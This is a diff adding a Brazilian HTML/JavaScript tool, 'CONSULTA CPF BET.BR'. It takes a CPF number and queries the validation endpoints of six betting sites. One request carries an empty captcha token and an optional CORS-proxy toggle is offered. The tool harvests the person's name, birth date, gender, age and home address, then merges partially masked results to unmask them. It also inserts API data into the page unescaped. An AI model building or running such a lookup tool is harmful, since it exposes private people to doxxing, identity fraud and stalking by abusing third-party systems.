@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CONSULTA CPF BET.BR</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 1100px;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .header {
+      background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+      color: white;
+      padding: 40px 30px;
+      text-align: center;
+    }
+
+    .header h1 {
+      font-size: 32px;
+      margin-bottom: 10px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+
+    .header p {
+      opacity: 0.9;
+      font-size: 14px;
+    }
+
+    .content {
+      padding: 40px 30px;
+    }
+
+    .controls-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .cors-toggle {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #f0f0f0;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: 2px solid #e0e0e0;
+    }
+
+    .cors-toggle label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin: 0;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .toggle-switch {
+      position: relative;
+      display: inline-block;
+      width: 50px;
+      height: 26px;
+    }
+
+    .toggle-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: #ccc;
+      transition: 0.4s;
+      border-radius: 26px;
+    }
+
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 20px;
+      width: 20px;
+      left: 3px;
+      bottom: 3px;
+      background-color: white;
+      transition: 0.4s;
+      border-radius: 50%;
+    }
+
+    input:checked + .slider {
+      background-color: #ff6b6b;
+    }
+
+    input:checked + .slider:before {
+      transform: translateX(24px);
+    }
+
+    .cors-status {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .cors-status.off {
+      background: #e8f5e9;
+      color: #2e7d32;
+    }
+
+    .cors-status.on {
+      background: #fff3e0;
+      color: #e65100;
+    }
+
+    .search-box {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 12px;
+      margin-bottom: 30px;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    input[type="text"] {
+      padding: 14px 16px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s;
+      font-weight: 500;
+    }
+
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #ff6b6b;
+      box-shadow: 0 0 0 3px rgba(255, 107, 107, 0.1);
+    }
+
+    .btn {
+      padding: 14px 40px;
+      background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      align-self: flex-end;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 40px;
+      color: #ff6b6b;
+    }
+
+    .spinner {
+      border: 4px solid #f0f0f0;
+      border-top: 4px solid #ff6b6b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .error {
+      background: #fee;
+      border-left: 4px solid #f44;
+      color: #c33;
+      padding: 16px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .error strong {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .results {
+      display: none;
+    }
+
+    .results.show {
+      display: block;
+    }
+
+    .section {
+      margin-bottom: 30px;
+    }
+
+    .section h2 {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 15px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 3px solid #ff6b6b;
+      padding-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .data-card {
+      background: #f8f9fa;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 15px;
+    }
+
+    .data-row {
+      display: grid;
+      grid-template-columns: 150px 1fr;
+      gap: 20px;
+      margin-bottom: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .data-row:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .data-label {
+      font-weight: 600;
+      color: #ff6b6b;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .data-value {
+      color: #333;
+      word-break: break-word;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+
+    .data-value.empty {
+      color: #999;
+      font-style: italic;
+    }
+
+    .data-sources {
+      background: #fff3e0;
+      border-left: 4px solid #ff9800;
+      padding: 10px 12px;
+      border-radius: 4px;
+      margin-top: 8px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .data-sources-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 6px;
+    }
+
+    .source-tag {
+      background: white;
+      border: 1px solid #ff9800;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #e65100;
+    }
+
+    .address-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    .address-field {
+      background: white;
+      padding: 14px;
+      border-radius: 6px;
+      border-left: 4px solid #ff6b6b;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    .address-field-label {
+      font-size: 11px;
+      color: #999;
+      text-transform: uppercase;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    .address-field-value {
+      color: #333;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .sources-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 12px;
+      margin-top: 15px;
+    }
+
+    .source-card {
+      background: white;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      padding: 16px;
+      transition: all 0.3s;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+
+    .source-card.loading {
+      border-color: #ffc107;
+      background: #fffbf0;
+      opacity: 0.7;
+    }
+
+    .source-card.success {
+      border-color: #4caf50;
+      background: #f1f8f4;
+    }
+
+    .source-card.error {
+      border-color: #f44;
+      background: #fef1f1;
+    }
+
+    .source-name {
+      font-weight: 600;
+      font-size: 13px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .source-status {
+      display: inline-block;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .source-status.loading {
+      background: #ffc107;
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    .source-status.ok {
+      background: #4caf50;
+    }
+
+    .source-status.error {
+      background: #f44;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .source-details {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.7;
+    }
+
+    .source-detail-row {
+      display: grid;
+      grid-template-columns: 80px 1fr;
+      gap: 8px;
+      margin-bottom: 6px;
+      padding: 6px;
+      background: rgba(255,107,107,0.02);
+      border-radius: 4px;
+    }
+
+    .source-detail-row:last-child {
+      margin-bottom: 0;
+    }
+
+    .source-detail-label {
+      font-weight: 600;
+      color: #ff6b6b;
+      font-size: 11px;
+      text-transform: uppercase;
+    }
+
+    .source-detail-value {
+      color: #333;
+      word-break: break-word;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+    }
+
+    .meta {
+      background: #fff3f5;
+      border-left: 4px solid #ff6b6b;
+      padding: 15px;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #333;
+    }
+
+    .meta-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+
+    .meta-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .meta-item strong {
+      color: #ff6b6b;
+    }
+
+    @media (max-width: 600px) {
+      .search-box {
+        grid-template-columns: 1fr;
+      }
+
+      .btn {
+        align-self: stretch;
+      }
+
+      .header {
+        padding: 30px 20px;
+      }
+
+      .header h1 {
+        font-size: 24px;
+      }
+
+      .content {
+        padding: 20px;
+      }
+
+      .data-row {
+        grid-template-columns: 1fr;
+        gap: 5px;
+      }
+
+      .data-label {
+        margin-bottom: 4px;
+      }
+
+      .controls-bar {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .sources-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .address-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🎰 CONSULTA CPF BET.BR</h1>
+      <p>Consulta em tempo real de 6 casas de apostas</p>
+    </div>
+
+    <div class="content">
+      <!-- Controls -->
+      <div class="controls-bar">
+        <div class="cors-toggle">
+          <label>
+            <span>CORS Proxy</span>
+            <div class="toggle-switch">
+              <input type="checkbox" id="cors-toggle" onchange="toggleCORS()">
+              <span class="slider"></span>
+            </div>
+          </label>
+          <span class="cors-status off" id="cors-status">Desativado</span>
+        </div>
+      </div>
+
+      <!-- Search Box -->
+      <div class="search-box">
+        <div class="input-group">
+          <label for="cpf-input">CPF (somente números)</label>
+          <input 
+            type="text" 
+            id="cpf-input" 
+            placeholder="12345678900" 
+            maxlength="11"
+            autocomplete="off"
+          >
+        </div>
+        <button class="btn" id="search-btn" onclick="search()">Consultar</button>
+      </div>
+
+      <!-- Error Messages -->
+      <div id="error" class="error" style="display: none;"></div>
+
+      <!-- Loading -->
+      <div id="loading" class="loading" style="display: none;">
+        <div class="spinner"></div>
+        <p>Consultando plataformas...</p>
+      </div>
+
+      <!-- Results -->
+      <div id="results" class="results">
+        <!-- Reconstructed Data -->
+        <div class="section">
+          <h2>📊 Dados Reconstruídos</h2>
+          <div class="data-card">
+            <div class="data-row">
+              <div class="data-label">CPF</div>
+              <div class="data-value" id="result-cpf"></div>
+            </div>
+            <div class="data-row">
+              <div class="data-label">Nome</div>
+              <div class="data-value" id="result-name"></div>
+              <div class="data-sources" id="name-sources" style="display: none;"></div>
+            </div>
+            <div class="data-row">
+              <div class="data-label">Data de Nascimento</div>
+              <div class="data-value" id="result-birth"></div>
+            </div>
+            <div class="data-row">
+              <div class="data-label">Gênero</div>
+              <div class="data-value" id="result-gender"></div>
+            </div>
+            <div class="data-row">
+              <div class="data-label">Idade</div>
+              <div class="data-value" id="result-age"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Address -->
+        <div class="section" id="address-section" style="display: none;">
+          <h2>📍 Endereço</h2>
+          <div class="data-card">
+            <div class="address-grid" id="address-grid"></div>
+          </div>
+        </div>
+
+        <!-- Sources -->
+        <div class="section">
+          <h2>🔗 Plataformas Consultadas (Dados Brutos)</h2>
+          <div class="sources-grid" id="sources-grid"></div>
+        </div>
+
+        <!-- Meta -->
+        <div class="meta">
+          <div class="meta-item">
+            <span>Plataformas Consultadas:</span>
+            <strong id="meta-total">0</strong>
+          </div>
+          <div class="meta-item">
+            <span>Plataformas com Dados:</span>
+            <strong id="meta-success">0</strong>
+          </div>
+          <div class="meta-item">
+            <span>Consultado em:</span>
+            <strong id="meta-time">-</strong>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let useCORSProxy = false;
+
+    const cpfInput = document.getElementById('cpf-input');
+    const searchBtn = document.getElementById('search-btn');
+    const errorDiv = document.getElementById('error');
+    const loadingDiv = document.getElementById('loading');
+    const resultsDiv = document.getElementById('results');
+    const corsToggle = document.getElementById('cors-toggle');
+    const corsStatus = document.getElementById('cors-status');
+
+    function toggleCORS() {
+      useCORSProxy = corsToggle.checked;
+      corsStatus.textContent = useCORSProxy ? 'Ativado' : 'Desativado';
+      corsStatus.className = `cors-status ${useCORSProxy ? 'on' : 'off'}`;
+    }
+
+    function wrapURL(url) {
+      if (useCORSProxy) {
+        return `https://corsproxy.io/?${encodeURIComponent(url)}`;
+      }
+      return url;
+    }
+
+    // ============ UTILS ============
+
+    function cleanCPF(cpf) {
+      return cpf.replace(/\D/g, '');
+    }
+
+    function formatCPF(cpf) {
+      const c = cleanCPF(cpf);
+      return `${c.slice(0, 3)}.${c.slice(3, 6)}.${c.slice(6, 9)}-${c.slice(9)}`;
+    }
+
+    function unmaskPart(str) {
+      if (!str) return '';
+      return str.replace(/\*/g, '');
+    }
+
+    function getAllNames(names) {
+      // Retorna todas as variações de nomes coletadas
+      return names.filter(Boolean).map(n => ({
+        original: n,
+        unmasked: unmaskPart(n),
+        masked: n.includes('*')
+      }));
+    }
+
+    function reconstructName(names) {
+      if (!names.length) return { full: null, sources: [] };
+
+      const variants = getAllNames(names);
+      
+      // Tenta encontrar nome completo sem máscaras
+      const complete = variants.filter(v => !v.masked);
+      if (complete.length > 0) {
+        return {
+          full: complete.sort((a, b) => b.unmasked.length - a.unmasked.length)[0].original,
+          sources: complete.map(v => v.original)
+        };
+      }
+
+      // Monta nome a partir de partes não-mascaradas
+      let parts = [];
+      
+      // Extrai todas as palavras não-mascaradas de todos os nomes
+      for (const v of variants) {
+        const words = v.original.split(/\s+/);
+        for (const word of words) {
+          const clean = unmaskPart(word);
+          if (clean && clean.length > 0) {
+            // Evita duplicatas
+            if (!parts.find(p => p.toLowerCase() === clean.toLowerCase())) {
+              parts.push(clean);
+            }
+          }
+        }
+      }
+
+      if (parts.length === 0) {
+        // Se tudo está mascarado, retorna o menos mascarado
+        const best = variants.sort((a, b) => b.unmasked.length - a.unmasked.length)[0];
+        return {
+          full: best.original,
+          sources: [best.original]
+        };
+      }
+
+      return {
+        full: parts.join(' '),
+        sources: variants.map(v => v.original)
+      };
+    }
+
+    function normalizeDate(dates) {
+      const normalized = [];
+      for (const d of dates) {
+        if (!d) continue;
+        const clean = d.replace(/\*/g, '');
+        if (/^\d{4}-\d{2}-\d{2}$/.test(clean)) normalized.push(clean);
+        else if (/^\d{2}\/\d{2}\/\d{4}$/.test(clean)) {
+          const [day, month, year] = clean.split('/');
+          normalized.push(`${year}-${month}-${day}`);
+        }
+      }
+      const complete = normalized.filter(n => !n.includes('*'));
+      return complete[0] || normalized[0] || null;
+    }
+
+    function reconstructGender(genders) {
+      const map = { 0: 'MALE', 1: 'FEMALE', 'FEMALE': 'FEMALE', 'MALE': 'MALE' };
+      const mapped = genders.map(g => map[g] || (typeof g === 'string' ? g.toUpperCase() : null)).filter(Boolean);
+      if (!mapped.length) return null;
+      
+      const counts = {};
+      for (const g of mapped) counts[g] = (counts[g] || 0) + 1;
+      return Object.entries(counts).sort((a, b) => b[1] - a[1])[0][0];
+    }
+
+    function reconstructAddress(addresses) {
+      if (!addresses.length) return {};
+      const result = {};
+      const fields = ['country', 'state', 'city', 'street', 'zipcode', 'neighborhood', 'number', 'complement'];
+      
+      for (const field of fields) {
+        const values = addresses.map(a => a[field]).filter(v => v && v !== 'N/A');
+        if (!values.length) continue;
+        
+        const complete = values.filter(v => !v.includes('*'));
+        if (complete.length) {
+          result[field] = complete.sort((a, b) => b.length - a.length)[0];
+        } else {
+          let best = values[0];
+          for (let i = 1; i < values.length; i++) {
+            const bWords = best.split(' ');
+            const oWords = values[i].split(' ');
+            const merged = [];
+            
+            for (let j = 0; j < Math.max(bWords.length, oWords.length); j++) {
+              const bw = bWords[j] || '';
+              const ow = oWords[j] || '';
+              
+              if (!ow.includes('*') && bw.includes('*')) {
+                merged.push(ow);
+              } else if (!bw.includes('*')) {
+                merged.push(bw);
+              } else {
+                merged.push(bw);
+              }
+            }
+            best = merged.join(' ');
+          }
+          result[field] = best;
+        }
+      }
+      return result;
+    }
+
+    // ============ API CALLERS ============
+
+    async function apiDonald(cpf) {
+      try {
+        const res = await fetch(wrapURL('https://donald.bet.br/api/auth/validate-document'), {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ number: cpf })
+        });
+        const data = await res.json();
+        return {
+          source: 'donald.bet.br',
+          ok: data.ok,
+          name: data.data?.name,
+          birth_date: data.data?.birth_date,
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'donald.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    async function apiBateu(cpf) {
+      try {
+        const res = await fetch(wrapURL('https://bateu.bet.br/api/documents/validate'), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'tenant': 'bateu.bet.br'
+          },
+          body: JSON.stringify({ number: cpf })
+        });
+        const data = await res.json();
+        return {
+          source: 'bateu.bet.br',
+          ok: data.success,
+          name: data.name,
+          birth_date: data.birth_date,
+          gender: data.gender,
+          age: data.age,
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'bateu.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    async function apiNgbras(cpf) {
+      try {
+        const res = await fetch(wrapURL(`https://alpha-users.ngbras.com/user/cpf?cpf=${cpf}`), {
+          headers: {
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'pt-BR',
+            'ngx-source': 'MOBILE',
+            'node-control-app': 'Decoded',
+            'origin': 'https://www.lottu.bet.br',
+            'priority': 'u=1, i',
+            'referer': 'https://www.lottu.bet.br/'
+          }
+        });
+        const data = await res.json();
+        const addr = data.address || {};
+        return {
+          source: 'lottu.bet.br',
+          ok: true,
+          name: data.name,
+          birth_date: data.birth_date,
+          gender: data.gender,
+          address: {
+            country: addr.country,
+            state: addr.state,
+            city: addr.city,
+            street: addr.street,
+            zipcode: addr.zipcode,
+            neighborhood: addr.neighborhood,
+            number: addr.number,
+            complement: addr.complement
+          },
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'lottu.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    async function apiB1bet(cpf) {
+      try {
+        const res = await fetch(wrapURL('https://b1bet.bet.br/api/documents/validate'), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ number: cpf, captcha_token: '' })
+        });
+        const data = await res.json();
+        return {
+          source: 'b1bet.bet.br',
+          ok: data.success,
+          name: data.name,
+          birth_date: data.birth_date,
+          gender: data.gender,
+          age: data.age,
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'b1bet.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    async function apiBrasilDaSorte(cpf) {
+      try {
+        const res = await fetch(wrapURL('https://brasildasorte.bet.br/api/validate/document'), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ document: formatCPF(cpf) })
+        });
+        const data = await res.json();
+        return {
+          source: 'brasildasorte.bet.br',
+          ok: true,
+          name: data.name,
+          birth_date: data.birthday,
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'brasildasorte.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    async function apiGoldebet(cpf) {
+      try {
+        const res = await fetch(wrapURL('https://goldebet.bet.br/api/validate/document'), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ document: formatCPF(cpf) })
+        });
+        const data = await res.json();
+        return {
+          source: 'goldebet.bet.br',
+          ok: true,
+          name: data.name,
+          birth_date: data.birthday,
+          raw: data
+        };
+      } catch (e) {
+        return { source: 'goldebet.bet.br', ok: false, error: e.message };
+      }
+    }
+
+    // ============ MAIN HANDLER ============
+
+    function showError(message) {
+      errorDiv.innerHTML = `<strong>❌ Erro:</strong> ${message}`;
+      errorDiv.style.display = 'block';
+      loadingDiv.style.display = 'none';
+      resultsDiv.classList.remove('show');
+    }
+
+    function hideError() {
+      errorDiv.style.display = 'none';
+    }
+
+    async function search() {
+      const cpf = cleanCPF(cpfInput.value);
+
+      if (cpf.length !== 11 || isNaN(cpf)) {
+        showError('CPF deve conter exatamente 11 dígitos');
+        return;
+      }
+
+      hideError();
+      loadingDiv.style.display = 'block';
+      resultsDiv.classList.remove('show');
+      searchBtn.disabled = true;
+
+      try {
+        // Consulta todas em paralelo
+        const apis = [
+          apiDonald(cpf),
+          apiBateu(cpf),
+          apiNgbras(cpf),
+          apiB1bet(cpf),
+          apiBrasilDaSorte(cpf),
+          apiGoldebet(cpf)
+        ];
+
+        const results = await Promise.all(apis);
+
+        // Coleta dados para reconstrução
+        const names = [], dates = [], genders = [], ages = [], addresses = [];
+        const sources = {};
+
+        for (const r of results) {
+          sources[r.source] = r;
+          if (!r.ok) continue;
+          if (r.name) names.push(r.name);
+          if (r.birth_date) dates.push(r.birth_date);
+          if (r.gender !== undefined && r.gender !== null) genders.push(r.gender);
+          if (r.age) ages.push(r.age);
+          if (r.address) addresses.push(r.address);
+        }
+
+        // Reconstrói
+        const nameResult = reconstructName(names);
+        const reconstructed = {
+          cpf: cpf,
+          cpf_formatted: formatCPF(cpf),
+          name: nameResult.full,
+          nameVariants: nameResult.sources,
+          birth_date: normalizeDate(dates),
+          gender: reconstructGender(genders),
+          age: ages.length ? Math.max(...ages) : null,
+          address: reconstructAddress(addresses)
+        };
+
+        // Calcula idade se tiver data
+        if (reconstructed.birth_date && !reconstructed.age) {
+          try {
+            const dt = new Date(reconstructed.birth_date);
+            const diff = Date.now() - dt.getTime();
+            reconstructed.age = Math.floor(diff / (1000 * 60 * 60 * 24 * 365));
+          } catch {}
+        }
+
+        displayResults(reconstructed, results);
+        loadingDiv.style.display = 'none';
+        resultsDiv.classList.add('show');
+
+      } catch (error) {
+        showError(`Falha na consulta: ${error.message}`);
+      } finally {
+        searchBtn.disabled = false;
+      }
+    }
+
+    function formatDate(date) {
+      if (!date) return '-';
+      try {
+        const [year, month, day] = date.split('-');
+        return `${day}/${month}/${year}`;
+      } catch {
+        return date;
+      }
+    }
+
+    function displayResults(recon, allResults) {
+      // Reconstructed Data
+      document.getElementById('result-cpf').textContent = recon.cpf_formatted || '-';
+      
+      const nameEl = document.getElementById('result-name');
+      const nameSourcesEl = document.getElementById('name-sources');
+
+      if (recon.name) {
+        nameEl.textContent = recon.name;
+        nameEl.classList.remove('empty');
+        
+        // Mostra as fontes
+        if (recon.nameVariants && recon.nameVariants.length > 0) {
+          const sources = recon.nameVariants.slice(0, 3).map(n => `<span class="source-tag">${n}</span>`).join('');
+          nameSourcesEl.innerHTML = `<strong>Variações coletadas:</strong><div class="data-sources-list">${sources}</div>`;
+          nameSourcesEl.style.display = 'block';
+        }
+      } else {
+        nameEl.textContent = 'Não identificado';
+        nameEl.classList.add('empty');
+        nameSourcesEl.style.display = 'none';
+      }
+
+      document.getElementById('result-birth').textContent = recon.birth_date 
+        ? formatDate(recon.birth_date) 
+        : '-';
+      
+      document.getElementById('result-gender').textContent = 
+        recon.gender 
+          ? (recon.gender === 'MALE' ? '👨 Masculino' : '👩 Feminino')
+          : '-';
+      
+      document.getElementById('result-age').textContent = recon.age ? `${recon.age} anos` : '-';
+
+      // Address
+      const addrSection = document.getElementById('address-section');
+      const addr = recon.address || {};
+      
+      if (Object.keys(addr).length > 0) {
+        addrSection.style.display = 'block';
+        const addressGrid = document.getElementById('address-grid');
+        addressGrid.innerHTML = '';
+
+        const addressLabels = {
+          'street': '🛣️ Rua',
+          'number': '🏠 Número',
+          'complement': '➕ Complemento',
+          'neighborhood': '🏘️ Bairro',
+          'city': '🏙️ Cidade',
+          'state': '🗺️ Estado',
+          'zipcode': '📮 CEP',
+          'country': '🌍 País'
+        };
+
+        for (const [key, label] of Object.entries(addressLabels)) {
+          if (addr[key]) {
+            const field = document.createElement('div');
+            field.className = 'address-field';
+            field.innerHTML = `
+              <div class="address-field-label">${label}</div>
+              <div class="address-field-value">${addr[key]}</div>
+            `;
+            addressGrid.appendChild(field);
+          }
+        }
+      } else {
+        addrSection.style.display = 'none';
+      }
+
+      // Sources
+      const sourcesGrid = document.getElementById('sources-grid');
+      sourcesGrid.innerHTML = '';
+
+      for (const source of allResults) {
+        const name = source.source;
+        const isOk = source.ok;
+        const card = document.createElement('div');
+        card.className = `source-card ${isOk ? 'success' : 'error'}`;
+        
+        let details = '';
+        if (isOk) {
+          const rows = [];
+          if (source.name) rows.push(`
+            <div class="source-detail-row">
+              <div class="source-detail-label">Nome</div>
+              <div class="source-detail-value">${source.name}</div>
+            </div>
+          `);
+          if (source.birth_date) rows.push(`
+            <div class="source-detail-row">
+              <div class="source-detail-label">Data Nasc.</div>
+              <div class="source-detail-value">${source.birth_date}</div>
+            </div>
+          `);
+          if (source.gender) rows.push(`
+            <div class="source-detail-row">
+              <div class="source-detail-label">Gênero</div>
+              <div class="source-detail-value">${source.gender}</div>
+            </div>
+          `);
+          if (source.age) rows.push(`
+            <div class="source-detail-row">
+              <div class="source-detail-label">Idade</div>
+              <div class="source-detail-value">${source.age} anos</div>
+            </div>
+          `);
+          details = rows.join('');
+        } else {
+          details = `<div class="source-details"><em>⚠️ ${source.error || 'Falha na consulta'}</em></div>`;
+        }
+
+        card.innerHTML = `
+          <div class="source-name">
+            <span class="source-status ${isOk ? 'ok' : 'error'}"></span>
+            <strong>${name}</strong>
+          </div>
+          <div class="source-details">${details || '<em>Sem dados</em>'}</div>
+        `;
+        sourcesGrid.appendChild(card);
+      }
+
+      // Meta
+      const successCount = allResults.filter(r => r.ok).length;
+      document.getElementById('meta-total').textContent = allResults.length;
+      document.getElementById('meta-success').textContent = successCount;
+      document.getElementById('meta-time').textContent = new Date().toLocaleString('pt-BR');
+    }
+
+    // Allow Enter key to search
+    cpfInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') search();
+    });
+
+    // Format CPF input
+    cpfInput.addEventListener('input', (e) => {
+      e.target.value = cleanCPF(e.target.value);
+    });
+  </script>
+</body>
+</html>
